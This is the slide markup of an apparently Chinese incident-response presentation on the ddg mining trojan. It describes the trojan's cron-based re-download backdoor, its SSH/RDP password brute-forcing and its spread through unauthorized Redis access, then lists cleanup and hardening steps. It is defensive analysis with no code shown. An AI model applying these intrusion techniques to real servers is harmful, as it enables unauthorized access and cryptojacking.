              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>外连请求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3107596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9875"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="79875"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7987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79874"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="79874"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7987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up)">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="19" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="20" presetID="53" presetClass="entr" presetSubtype="16"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p:bldP spid="7" grpId="0"/>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5C2DA0-E9F9-AC41-AAFB-A2EE7FDB25A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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1922" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="755576" y="1558038"/>
            <a:ext cx="785098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Step6: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>查看定时任务，发现攻击者在计划任务中留下了定时启动脚本，删除挖矿程序后可通过每隔</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>分钟执行一次计划任务中的后门脚本重新下载启动；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="81923"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2852936"/>
            <a:ext cx="7202168" cy="91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4"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982" y="4005064"/>
            <a:ext cx="7202167"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13036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1922"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="81922"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8192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1923"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="81923"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8192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81924"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="17" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="81924"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="819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A93549-9BE8-DE4B-9CAF-A6BB849128A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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2946" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="481013" y="1716881"/>
            <a:ext cx="785098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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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t>Step7: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>云端</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>i.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>脚本</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>f</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>分析，其</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>内容如下</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>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479019"/>
            <a:ext cx="8296498" cy="3225693"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="D9D9D9"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>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0002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2946"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="82946"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="0-#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8294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05AEBE-4BDB-1D4D-90E4-0740B078547A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="521734" y="69269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3970" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="519601" y="1347083"/>
            <a:ext cx="7850981"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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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t>Step8: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>经后端人员反编译分析</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ddg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>样本后，发现此样本有弱口令爆破的功能，使用内置账户</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>口令字典，对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rdp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>进行批量登录尝试，爆破成功后继续横向传播。该挖矿木马还可通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>redis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>未授权访问漏洞进行传播</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>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852936"/>
            <a:ext cx="8165678" cy="3380432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="D9D9D9"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>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5533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3970"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="83970"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8397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BAF21F-2465-1E43-8949-871D4C14AABA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="481013" y="76470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4994" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971600" y="2204864"/>
            <a:ext cx="7200800" cy="3201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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>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sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>中招服务器临时解决方案：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>清除挖矿后台任务</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>终止挖矿进程</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>清理挖矿相关文件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="1028700" lvl="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>防火墙上封禁挖矿样本下载和外连地址</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1412776"/>
            <a:ext cx="1593706"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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>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）结论</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9207505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4994"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="84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193445-4D3F-B544-AB7D-1A5E659DA0A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251520"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7042" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="323528" y="2251174"/>
            <a:ext cx="8287318" cy="3426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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>修改操作系统用户密码，同时密码应严格使用复杂口令，避免密码的重用情况，避免规律性，定期进行修改； </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>加强访问控制策略，限制粒度达到端口级，如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SSH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>、</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0" err="1">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>redis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>白名单策略，对于业务无需外网访问的情况下，禁止对外网直接提供访问；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>开启登录事件检测，对大量登录失败的源</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>进行登录限制，防止服务口令爆破；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="p"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>开启</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>SSH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" dirty="0">
